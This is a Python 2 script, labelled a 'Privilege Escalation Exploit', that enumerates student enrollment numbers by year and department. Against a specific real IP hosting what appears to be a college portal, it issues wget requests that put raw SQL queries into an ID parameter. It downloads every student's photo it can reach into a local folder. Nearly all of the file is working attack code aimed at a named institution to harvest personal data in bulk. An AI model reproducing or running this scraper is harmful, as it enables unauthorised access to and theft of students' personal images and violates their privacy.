import os

#Decoration Starts
print """
+=============================================================+
||		  Privilege Escalation Exploit	             ||
||   +===================================================+   ||
||   |    _   _    _    ____ _  __    ____  ___ _____    |   ||
||   |   | | | |  / \  / ___| |/ /   |  _ \|_ _|_   _|   |   ||
||   |   | |_| | / _ \| |   | ' /    | |_) || |  | |     |   ||
||   |   |  _  |/ ___ \ |___| . \    |  _ < | |  | |     |   ||
||   |   |_| |_/_/   \_\____|_|\_\   |_| \_\___| |_|     |   ||
||   |                                                   |   ||
||   +===================================================+   ||
||   ~ by Yadnyawalkya Tale (yadnyawalkyatale@gmail.com) ~   ||
+=============================================================+
"""
#Decoration Ends

# Class according to Year Input 
print "\n1. B.Tech Final Year\n2. T.Y.B.Tech\n3. S.Y.B.Tech\n4. F.Y.Tech"
year_input = input()

if year_input == 1:
	year_choice = 1300000 #Final Year
elif year_input == 2:
	year_choice = 1400000 #Third Year
elif year_input == 3:
	year_choice = 1500000 #Second Year
elif year_input == 4:
	year_choice = 1600000 #First Year

# Department Class Input
print "\n1.Automobile\n2.Civil\n3.ComputerScience\n4.InformationTechnology\n5.ETC\n6.Electrial\n7.Mech"
class_input = input()

if class_input == 1:
	class_choice = 1000 #Automobile Department
elif class_input == 2:
	class_choice = 2000 #Civil Department
elif class_input == 3:
	class_choice = 3000 #ComputerScience Department
elif class_input == 4:
	class_choice = 4000 #InformationTechnology Department
elif class_input == 5:
	class_choice = 5000 #ETC Department
elif class_input == 6:
	class_choice = 8000 #Electrial Department
elif class_input == 7:
	class_choice = 6000 #Mechanical Department

startflag = year_choice + class_choice 		#For eg. Start @ 1303000
if class_input == 7:
	endflag = year_choice + class_choice + 70 +128	#Special Arrangement for Mechanical ;)
else:
	endflag = year_choice + class_choice + 70 	#For eg. End @ 1303070

os.system("mkdir ritphotos")

decoration="="
while startflag < endflag:
    startflag = startflag + 1
    cmd1 = "wget http://210.212.171.168/ritcloud/StudentPhoto.ashx?ID=SELECT%20Photo%20FROM%20StudMstAll%20WHERE%20EnrollNo%20=%20%27{0}%27 -O ritphotos/photo_{1}.jpg 2>/dev/null ".format(startflag,startflag)
    os.system(cmd1)
    decoration = "=" + decoration
    print "{0}".format(decoration)
print "100%\tPlease Wait..."

pstartflag = year_choice + class_choice + 150000
if class_input == 7:
	pendflag = year_choice + class_choice + 40 + 150000 #For All branches
else:
	pendflag = year_choice + class_choice + 15 + 150000 #Special Arrangement for Mechanical ;)

while pstartflag < pendflag:
    pstartflag = pstartflag + 1
    cmd2 = "wget http://210.212.171.168/ritcloud/StudentPhoto.ashx?ID=SELECT%20Photo%20FROM%20StudMstAll%20WHERE%20EnrollNo%20=%20%27{0}%27 -O ritphotos/photo_{1}.jpg 2>/dev/null ".format(pstartflag,pstartflag)
    os.system(cmd2)

print "Downloading Images Complete..."
os.system("find ritphotos -size  0 -print0 |xargs -0 rm 2>/dev/null ") #Remove 0-Size Images
